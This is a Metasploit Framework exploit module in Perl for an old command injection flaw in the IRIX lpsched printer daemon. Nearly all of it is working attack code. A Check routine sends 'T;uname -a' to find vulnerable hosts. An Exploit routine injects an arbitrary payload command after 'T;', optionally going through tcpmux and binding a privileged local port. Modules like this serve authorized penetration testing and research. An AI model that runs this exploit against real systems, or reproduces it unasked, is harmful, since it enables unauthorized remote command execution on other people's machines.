
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::irix_lpsched_exec;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = {};

my $info = {
    'Name'    => 'Irix lpsched Command Execution',
    'Version'  => '$Revision$',
    'Authors'  => ['Optyx <optyx [at] uberhax0r.net>',
                  'LSD <http://www.lsd-pl.net>'],
    'Arch'    => [],
    'OS'      => ['irix'],
    'Priv'    => 0,
    'Payload' => {
        'Space'    => 4096,
        'BadChars' => "\x00",
        'Keys'      => ['cmd'],        
    },

    'UserOpts' => {
        'RHOST' => [1, 'ADDR', 'The target address'],
        'RPORT' => [1, 'PORT', 'The lpsched target port', 515],
	'USE_TCPMUX' => [0, 'TCPMUX', 'Use tcpmux to indirectly exploit'],
    },

    'Description' => Pex::Text::Freeform(qq{
	YASGIPB (yet another sgi popen bug)
	like cmd execs, nice and smooth like cool beer
    }),
    'Refs' =>
        [
            ['URL',   'http://www.lsd-pl.net/code/IRIX/irx_lpsched.c'],
        ],
    'DefaultTarget' => 0,
    'Targets' => [["No Target Needed"]],
    'Keys'  => ['lpsched'],    
};

sub new {
    my $class = shift;
    my $self  =
      $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
    return ($self);
}

sub Check {
    my $self        = shift;
    my $priv_port = $self->GetVar('CPORT');
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_tcpmux = $self->GetVar('USE_TCPMUX');
    my $s;

    if ($target_tcpmux) {
      $target_port = $target_tcpmux;
    }

    if ($priv_port == 0) {
	for ($priv_port = 200; $priv_port < 1024; $priv_port++) {
	  $s = Msf::Socket::Tcp->new
	  ( 
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $priv_port,
	  );
	  if (!$s->IsError) {
		last;
	  }
      }

      if ($priv_port == 1024)
      {
	  $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
	  return $self->CheckCode('Connect');
      }
    }
    else
    {
    	$s = Msf::Socket::Tcp->new
    	(
       		'PeerAddr'  => $target_host, 
        	'PeerPort'  => $target_port, 
        	'LocalPort' => $self->GetVar('CPORT'),
    	);

	if ($s->IsError) {
	  $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
	  return $self->CheckCode('Connect');
	}
    }

    if ($target_tcpmux)
    {
	$s->Send("sgi_printer\n");
	$s->Recv(-1, 300);
    }

    $s->Send("T;uname -a\n");
    my $r = $s->Recv(-1, 5);

    if ($r && $r =~ m/IRIX/) {
        $self->PrintLine("[*] Vulnerable");
    } else {
        $self->PrintLine("[*] Not Vulnerable");
    }
    return $self->CheckCode('Generic');
}

sub Exploit {
    my $self        = shift;
    my $priv_port = $self->GetVar('CPORT');
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_tcpmux = $self->GetVar('USE_TCPMUX');
    my $s;

    my $encodedPayload = $self->GetVar('EncodedPayload');

    if ($target_tcpmux) {
      $target_port = $target_tcpmux;
    }

    if ($priv_port == 0) {
        for ($priv_port = 200; $priv_port < 1024; $priv_port++) {
          $s = Msf::Socket::Tcp->new
          (
                'PeerAddr'  => $target_host,
                'PeerPort'  => $target_port,
                'LocalPort' => $priv_port,
          );
          if (!$s->IsError) {
                last;
          }
      }

      if ($priv_port == 1024)
      {
          $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
          return;
      }
    }
    else
    {
        $s = Msf::Socket::Tcp->new
        (
                'PeerAddr'  => $target_host,
                'PeerPort'  => $target_port,
                'LocalPort' => $self->GetVar('CPORT'),
        );

        if ($s->IsError) {
          $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
          return;
        }
    }

    if ($target_tcpmux)
    {
        $s->Send("sgi_printer\n");
        $s->Recv(-1, 300);
    }

    $self->PrintLine("[*] Executing command " . $encodedPayload->RawPayload);

    $s->Send("T;" . $encodedPayload->RawPayload . "\n");
    sleep(3);
    return;
}

